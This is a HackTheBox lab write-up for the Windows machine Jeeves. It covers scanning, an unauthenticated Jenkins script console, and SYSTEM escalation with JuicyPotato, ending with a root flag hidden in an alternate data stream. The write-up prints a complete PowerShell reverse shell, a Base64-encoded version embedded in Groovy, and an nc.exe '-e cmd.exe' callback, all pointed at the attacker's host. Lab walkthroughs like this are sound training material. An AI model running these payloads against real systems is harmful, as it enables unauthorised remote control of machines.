---
title: "HTB - Jeeves Writeup"
date: 2026-10-26 07:52:00 +0700
categories: [HackTheBox, Machines]
tags: [windows, medium]
---
Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.
## P0
First of all, I use rustscan to find out all opened ports:<br>
```
└─$ rustscan -a 10.129.62.218 --ulimit 5000 --range 0-65535 --no-banner --scripts none
[~] Automatically increasing ulimit value to 5000.
Open 10.129.62.218:80
Open 10.129.62.218:135
Open 10.129.62.218:445
Open 10.129.62.218:50000
10.129.62.218 -> [80,135,445,50000]
```
Then I use nmap for getting details about them:<br>
```
└─$ nmap -O -sV -sC -Pn --disable-arp-ping --traceroute -p80,135,445,50000 -oN 10.129.62.218_nmap 10.129.62.218
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 20:56 -0400
Nmap scan report for 10.129.62.218 (10.129.62.218)
Host is up (0.060s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Microsoft Windows 2008|7|10|11|Vista|2012|Phone (91%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (88%), Microsoft Windows Server 2008 R2 (87%), Microsoft Windows 11 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-10-26T05:55:12
|_  start_date: 2026-10-26T05:46:07
|_clock-skew: mean: 4h58m44s, deviation: 0s, median: 4h58m44s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   59.89 ms 10.10.14.1 (10.10.14.1)
2   60.09 ms 10.129.62.218 (10.129.62.218)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.50 seconds
```
## P1
Firstly, we do some basic enumeration on port 80:
```
└─$ ffuf -u http://10.129.62.218:50000/FUZZ -w /mnt/hgfs/D/bb/pentest-tools/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.62.218:50000/FUZZ
 :: Wordlist         : FUZZ: /mnt/hgfs/D/bb/pentest-tools/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
```
What's interesting ! We find out a path **/askjeeves** and it allows us to access to jenkins admin dashboard without requiring authentication :D

![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-30.png){: w="700" }

## P2
Whenever coming up with this situation, I always go directly to "Script console" where we can abuse groovy to create some reverse shell.<br>

![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-31.png){: w="700" }

First of all, prepare a powershell reverse shell with my listener on kali linux **10.10.15.107:9001**:
```
└─$ nc -nlvp 9001
```
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.107', 9001);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
To avoid this reverse shell being filtered for unusual characters, I usually encode it to **UTF-16LE** and then **Base64**

![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-28.png){: w="700" }

Good, now we have a new payload like this:
```
powershell.exe -nop -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADcAJwAsADkAMAAwADEAKQA7ACQAcwAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAIAA9ACAAJABzAGIAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBiAHQAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
Okey, now we create a completed reverse shell in groovy:
```
def cmd = "powershell.exe -nop -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADcAJwAsADkAMAAwADEAKQA7ACQAcwAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBiADIAIAA9ACAAJABzAGIAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBiAHQAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA".execute();
```

![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-31_1.png){: w="700" }

Put it in **Script Console** and click **Run**. And our listener receive connection from reverse shell. Very nice !!

```
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.15.107] from (UNKNOWN) [10.129.62.218] 49681

PS C:\Users\Administrator\.jenkins>
```
Read **c:\users\kohsuke\Desktop\user.txt** to get the first flag !
```
PS C:\users\kohsuke\Desktop> type user.txt
```
## P3 & P4
Now it's time for us to privilege escalate. Luckily, the current user has **SeImpersonatePrivilege** privilege. Time for playing with **Potatoes** :D
```
PS C:\Users\Administrator\.jenkins> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
On my kali linux, I create a **smb server** just for a way to copy file from my attack host to the target.
```
└─$ sudo impacket-smbserver share -smb2support /mnt/hgfs/D/bb/pentest-tools/windows-tools/windows-privesc
```
I have tried with many type of **Potato** but just **JuicyPotato** works well. So for easily writing blog :), I will only copy **JuicyPotato.exe** and **nc.exe** to the target.
```
PS C:\Users\Administrator\.jenkins> Copy-Item \\10.10.15.107\share\JuicyPotato.exe
PS C:\Users\Administrator\.jenkins> Copy-Item \\10.10.15.107\share\nc.exe
```
Next, search for CLSID:
```
PS C:\Users\Administrator\.jenkins> reg query HKCR\CLSID /s /f "LocalService"

HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
    LocalService    REG_SZ    winmgmt

HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
    LocalService    REG_SZ    winmgmt

End of search: 2 match(es) found.
```
Okey, we have all indeed data, now start the listener on my attacker host:
```
nc -lvnp 3001
```
Use **JuicyPotato.exe** to create a reverse shell to my listner:
```
PS C:\Users\Administrator\.jenkins> .\JuicyPotato.exe -t * -p cmd.exe -l 53375 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -a "/c c:\users\administrator\.jenkins\nc.exe 10.10.15.107 3001 -e cmd.exe"
Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 53375
......
[+] authresult 0
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```
```
└─$ nc -lvnp 3001
listening on [any] 3001 ...
connect to [10.10.15.107] from (UNKNOWN) [10.129.62.218] 50247
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
After have **SYSTEM** shell, I go directly to Administrator Desktop folder and face with this :)
```
C:\Windows\system32>type c:\users\Administrator\Desktop\hm.txt
type c:\users\Administrator\Desktop\hm.txt
The flag is elsewhere.  Look deeper.
```
Because the file name which contains the root flag usually is **root.txt** or **flag.txt** so I try to find it manually like these:
```
C:\Windows\system32>dir /s /b C:\*flag* 2>nul               
dir /s /b C:\*flag* 2>nul
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\shared\diorama\diorama31\episode91\models\interactable\ep91_flags.ffm
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\shared\diorama\diorama33\episode97\models\interactable\ep97_royal_flag.ffm
C:\Windows\InfusedApps\Packages\Microsoft.Office.Sway_17.6216.20251.0_x64__8wekyb3d8bbwe\Assets\WebPlayer\newfeatureflag.png
C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Assets\flags.htm
C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\en-US\assets\flags.htm
C:\Windows\WinSxS\amd64_microsoft-windows-m..osoftedge.resources_31bf3856ad364e35_10.0.10586.0_en-us_79b8789c46d2112b\flags.htm
C:\Windows\WinSxS\amd64_microsoft-windows-m..osoftedge.resources_31bf3856ad364e35_10.0.10586.218_en-us_5a620bbcfb647a86\flags.htm
C:\Windows\WinSxS\amd64_microsoft-windows-microsoftedge_31bf3856ad364e35_10.0.10586.0_none_9dbd56cc9a76ad54\flags.htm
C:\Windows\WinSxS\amd64_microsoft-windows-microsoftedge_31bf3856ad364e35_10.0.10586.1176_none_3e3d2fa1f737d9cf\flags.htm
```
```
C:\Windows\system32>dir /s /b C:\*root* 2>nul
dir /s /b C:\*root* 2>nul
C:\Documents and Settings\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs
C:\Documents and Settings\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs\jenkins-update-center-root-ca
C:\Documents and Settings\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs\jenkins-update-center-root-ca.txt
C:\Documents and Settings\Administrator\AppData\Roaming\Microsoft\Windows\Recent\wwwroot.lnk
C:\Documents and Settings\Administrator\Application Data\Microsoft\Windows\Recent\wwwroot.lnk
C:\Documents and Settings\Administrator\Recent\wwwroot.lnk
C:\inetpub\wwwroot
C:\inetpub\temp\IIS Temporary Compressed Files\DefaultAppPool\$^_gzip_C^\INETPUB\WWWROOT
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_editor.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_emscripten.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_emscripten_dev.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_low_end.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_dev.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_low.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_low_dev.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_low_ota.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_low_ota_dev.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_ota.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\root_package_mobile_ota_dev.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\kingdom-views\scenes\menu_root.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\kingdom-views\scenes\root.xml
C:\Program Files\WindowsApps\king.com.CandyCrushSodaSaga_1.100.600.0_x86__kgqvnymyfvs32\res_output\kingdom-views\scenes\view_root_layout.xml
C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_17.7608.23501.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
C:\Program Files\WindowsApps\Microsoft.Office.OneNote_17.8625.21151.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_17.8008.42001.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
C:\Users\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs
C:\Users\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs\jenkins-update-center-root-ca
C:\Users\Administrator\.jenkins\war\WEB-INF\update-center-rootCAs\jenkins-update-center-root-ca.txt
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\wwwroot.lnk
C:\Users\Administrator\Application Data\Microsoft\Windows\Recent\wwwroot.lnk
C:\Users\Administrator\Recent\wwwroot.lnk
C:\Windows\assembly\NativeImages_v4.0.30319_32\Microsoft.W0bb5dac4#\2cdb0a146f57526d407eeb611d5110d1\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.ni.dll
C:\Windows\assembly\NativeImages_v4.0.30319_32\Microsoft.W0bb5dac4#\2cdb0a146f57526d407eeb611d5110d1\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.ni.dll.aux
C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.W0bb5dac4#\aef6f11bf8a171cf4e61775ec78afc15\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.ni.dll
C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.W0bb5dac4#\aef6f11bf8a171cf4e61775ec78afc15\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.ni.dll.aux
C:\Windows\INF\vdrvroot.inf
C:\Windows\INF\vdrvroot.PNF
C:\Windows\InfusedApps\Packages\Microsoft.MicrosoftOfficeHub_17.6306.23501.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
C:\Windows\InfusedApps\Packages\Microsoft.Office.OneNote_17.6131.10051.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
C:\Windows\InfusedApps\Packages\Microsoft.Office.Sway_17.6216.20251.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
C:\Windows\InfusedApps\Packages\microsoft.windowscommunicationsapps_17.6308.42271.0_x64__8wekyb3d8bbwe\en-us\CT_ROOTS.XML
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.Resources
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause\v4.0_10.0.0.0__31bf3856ad364e35\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.dll
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.Resources\v4.0_1.0.0.0_en_31bf3856ad364e35\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.resources.dll
C:\Windows\System32\catroot
C:\Windows\System32\DriverStore\en-US\vdrvroot.inf_loc
C:\Windows\System32\DriverStore\FileRepository\vdrvroot.inf_amd64_d2ddbd0f3a5454ae
C:\Windows\System32\DriverStore\FileRepository\vdrvroot.inf_amd64_d2ddbd0f3a5454ae\vdrvroot.inf
C:\Windows\System32\DriverStore\FileRepository\vdrvroot.inf_amd64_d2ddbd0f3a5454ae\vdrvroot.sys
C:\Windows\System32\DriverStore\FileRepository\wiahp008.inf_amd64_b8d3b6bdcf46f3d9\amd64\HPWia2DrvRootWn8.dll
C:\Windows\SysWOW64\catroot
C:\Windows\WinSxS\amd64_dual_vdrvroot.inf_31bf3856ad364e35_10.0.10586.0_none_488a12d3db97881f
C:\Windows\WinSxS\amd64_microsoft-hyper-v-vpci-rootporterr_31bf3856ad364e35_10.0.10586.0_none_a3a2360aa71a7b28
C:\Windows\WinSxS\amd64_microsoft-windows-c..sktop.appxmain.root_31bf3856ad364e35_10.0.10586.0_none_6796a3c058d600b3
C:\Windows\WinSxS\amd64_microsoft-windows-c..sktop.appxmain.root_31bf3856ad364e35_10.0.10586.1106_none_080f7a8fb59d7bcd
C:\Windows\WinSxS\amd64_microsoft-windows-m..levelmanifests-root_31bf3856ad364e35_10.0.10586.0_none_eb31f683ea41dee5
C:\Windows\WinSxS\amd64_vdrvroot.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_ddb133dffa83a812
C:\Windows\WinSxS\msil_microsoft.windows.d..rootcause.resources_31bf3856ad364e35_10.0.10586.0_en-us_8c0b0128d50fa19d
C:\Windows\WinSxS\msil_microsoft.windows.d..updatediagrootcause_31bf3856ad364e35_10.0.10586.0_none_bb38abc36e99ad1a
C:\Windows\WinSxS\amd64_dual_vdrvroot.inf_31bf3856ad364e35_10.0.10586.0_none_488a12d3db97881f\vdrvroot.inf
C:\Windows\WinSxS\amd64_dual_vdrvroot.inf_31bf3856ad364e35_10.0.10586.0_none_488a12d3db97881f\vdrvroot.sys
C:\Windows\WinSxS\amd64_microsoft-hyper-v-v..otporterr.resources_31bf3856ad364e35_10.0.10586.0_en-us_5e4f9985853701c5\removerootporterr.mfl
C:\Windows\WinSxS\amd64_microsoft-hyper-v-v..otporterr.resources_31bf3856ad364e35_10.0.10586.0_en-us_5e4f9985853701c5\rootporterr.mfl
C:\Windows\WinSxS\amd64_microsoft-hyper-v-vpci-rootporterr_31bf3856ad364e35_10.0.10586.0_none_a3a2360aa71a7b28\removerootporterr.mof
C:\Windows\WinSxS\amd64_microsoft-hyper-v-vpci-rootporterr_31bf3856ad364e35_10.0.10586.0_none_a3a2360aa71a7b28\rootporterr.mof
C:\Windows\WinSxS\amd64_microsoft-windows-unimodem-core_31bf3856ad364e35_10.0.10586.0_none_211dcb247ee5229b\rootmdm.sys
C:\Windows\WinSxS\amd64_vdrvroot.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_ddb133dffa83a812\vdrvroot.inf_loc
C:\Windows\WinSxS\amd64_vdrvroot.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_ddb133dffa83a812\vdrvroot.sys.mui
C:\Windows\WinSxS\amd64_wiahp008.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_1d559b940c40a623\HPWia2DrvRootWn8.dll.mui
C:\Windows\WinSxS\amd64_wiahp008.inf_31bf3856ad364e35_10.0.10586.0_none_20165d751d27bff5\amd64\HPWia2DrvRootWn8.dll
C:\Windows\WinSxS\FileMaps\$$_system32_catroot2_dcafaffaaa56ddae.cdf-ms
C:\Windows\WinSxS\FileMaps\$$_system32_catroot_dcafaffa24ca18cc.cdf-ms
C:\Windows\WinSxS\FileMaps\$$_system32_catroot_f750e6c3-38ee-11d1-85e5-00c04fc295ee__0f6ee2e4c9b287a4.cdf-ms
C:\Windows\WinSxS\FileMaps\$$_syswow64_catroot_19d09cfeaa84d098.cdf-ms
C:\Windows\WinSxS\FileMaps\$$_syswow64_catroot_f750e6c3-38ee-11d1-85e5-00c04fc295ee__ada83e5211e1e29e.cdf-ms
C:\Windows\WinSxS\FileMaps\inetpub_wwwroot_6ed3ca13b4c8f4c8.cdf-ms
C:\Windows\WinSxS\Manifests\amd64_dual_vdrvroot.inf_31bf3856ad364e35_10.0.10586.0_none_488a12d3db97881f.manifest
C:\Windows\WinSxS\Manifests\amd64_microsoft-hyper-v-vpci-rootporterr_31bf3856ad364e35_10.0.10586.0_none_a3a2360aa71a7b28.manifest
C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-c..sktop.appxmain.root_31bf3856ad364e35_10.0.10586.0_none_6796a3c058d600b3.manifest
C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-c..sktop.appxmain.root_31bf3856ad364e35_10.0.10586.1106_none_080f7a8fb59d7bcd.manifest
C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-capi2-test-root_31bf3856ad364e35_10.0.10586.0_none_f7f63ae5cdb9fbe6.manifest
C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-clientrootsecurity_31bf3856ad364e35_10.0.10586.0_none_7ec0da466b62c814.manifest
C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-m..levelmanifests-root_31bf3856ad364e35_10.0.10586.0_none_eb31f683ea41dee5.manifest
C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-rootenum-temp_31bf3856ad364e35_10.0.10586.0_none_e47cc5762f118f15.manifest
C:\Windows\WinSxS\Manifests\amd64_microsoft-windows-rootsecurity_31bf3856ad364e35_10.0.10586.0_none_fe878e5427454e13.manifest
C:\Windows\WinSxS\Manifests\amd64_vdrvroot.inf-languagepack_31bf3856ad364e35_10.0.10586.0_en-us_b88d3e4339719e6b.manifest
C:\Windows\WinSxS\Manifests\amd64_vdrvroot.inf.resources_31bf3856ad364e35_10.0.10586.0_en-us_ddb133dffa83a812.manifest
C:\Windows\WinSxS\Manifests\msil_microsoft.windows.d..rootcause.resources_31bf3856ad364e35_10.0.10586.0_en-us_8c0b0128d50fa19d.manifest
C:\Windows\WinSxS\Manifests\msil_microsoft.windows.d..updatediagrootcause_31bf3856ad364e35_10.0.10586.0_none_bb38abc36e99ad1a.manifest
C:\Windows\WinSxS\msil_microsoft.windows.d..rootcause.resources_31bf3856ad364e35_10.0.10586.0_en-us_8c0b0128d50fa19d\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.resources.dll
C:\Windows\WinSxS\msil_microsoft.windows.d..updatediagrootcause_31bf3856ad364e35_10.0.10586.0_none_bb38abc36e99ad1a\Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootcause.dll
```
Sadly, no files are true !!!!.<br>
Just when it seemed all hope was lost, I suddenly remembered a time in the past when I was pentesting an upload feature and reading payloads on PayloadAllTheThings. I recalled a payload related to something called Alternate Data Stream (ADS) on Windows. Why don't I try it on this lab?

![Upgrade_Notice.pdf](assets/image/htb/jeeves/2026-10-26_09-56.png){: w="700" }

```
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,635,968,512 bytes free
```
So good, thanks my memory !!
```
C:\Users\Administrator\Desktop>more < hm.txt:root.txt
```